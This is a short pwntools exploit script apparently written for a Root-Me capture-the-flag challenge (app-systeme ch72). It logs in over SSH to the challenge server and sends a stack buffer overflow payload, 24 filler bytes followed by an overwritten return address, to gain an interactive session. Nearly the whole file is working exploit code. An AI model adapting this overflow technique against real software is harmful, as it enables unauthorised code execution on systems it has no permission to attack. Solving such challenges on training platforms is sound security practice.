from pwn import *

#context.terminal = ['tmux', 'splitw', '-h']
context.os = 'windows'

s = ssh('app-systeme-ch72', 'challenge05.root-me.org', password='app-systeme-ch72', port=2225)
p = s.process('/challenge/app-systeme/ch72/./wrapper.sh')

#gdb.attach(p, 'break main')
#p = gdb.debug("./ch72.exe", ssh=s)


payload = ""
payload += "A" * 24
payload += "\x00\x10\x40\x00"

p.sendline(payload)
p.interactive()
